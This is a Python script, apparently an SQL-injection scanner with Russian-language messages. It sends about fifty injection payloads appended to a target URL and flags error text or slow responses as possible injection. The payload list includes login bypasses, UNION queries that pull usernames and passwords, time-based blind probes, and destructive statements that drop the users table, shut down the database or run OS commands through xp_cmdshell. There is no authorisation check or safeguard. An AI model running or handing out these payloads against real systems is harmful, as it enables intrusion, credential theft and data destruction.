import requests
import time

payloads = [
    "' OR 1=1 -- ",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR '1'='1' -- ",
    "admin' --",
    "'; --",
    "') OR ('1'='1",
    "' OR 'x'='x",
    "' OR 1=1 LIMIT 1 --",
    "' AND 1=2 -- ",
    "' AND '1'='2",
    "' AND 1=1 -- ",
    "' AND '1'='1",
    "' AND SLEEP(5) -- ",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR EXISTS(SELECT * FROM users) -- ",
    "' OR NOT EXISTS(SELECT * FROM users) -- ",
    "' OR (SELECT COUNT(*) FROM users) > 0 -- ",
    "' OR (SELECT COUNT(*) FROM users) = 1 -- ",
    "' UNION SELECT NULL -- ",
    "' UNION SELECT NULL,NULL -- ",
    "' UNION SELECT 1,2,3 -- ",
    "' UNION SELECT username, password FROM users -- ",
    "'; DROP TABLE users --",
    "'; SHUTDOWN --",
    "'; EXEC xp_cmdshell('dir') --",
    "'; exec sp_helpuser --",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR ''='",
    "' OR 1=1-- -",
    "' AND 1=0--",
    "' OR 1=1--+",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1 LIMIT 1 OFFSET 0 -- ",
    "' OR 1 GROUP BY CONCAT(username, 0x3a, password) -- ",
    "' OR SLEEP(3) -- ",
    "' OR benchmark(1000000,MD5(1))--",
    "' AND ASCII(SUBSTRING((SELECT version()), 1, 1)) > 70 -- ",
    "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int) -- ",
    "\" OR 1=1 -- ",
    "\" OR SLEEP(5) -- ",
    "' OR (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM users)) -- ",
    "' AND (SELECT SUBSTRING(@@version,1,1)) = '5' -- ",
]


def test_sql_injection(base_url):
    results = []

    for payload in payloads:
        full_url = base_url + payload
        print(f"[DEBUG] Тестируем: {full_url}")
        try:
            start = time.time()
            res = requests.get(full_url, timeout=10)
            elapsed = time.time() - start

            if "sql" in res.text.lower() or "syntax" in res.text.lower() or elapsed > 4:
                results.append({
                    "payload": payload,
                    "time": round(elapsed, 2),
                    "message": "Возможна SQL-инъекция"
                })
        except Exception as e:
            results.append({
                "payload": payload,
                "time": 0,
                "message": f"Ошибка запроса: {e}"
            })

    return results
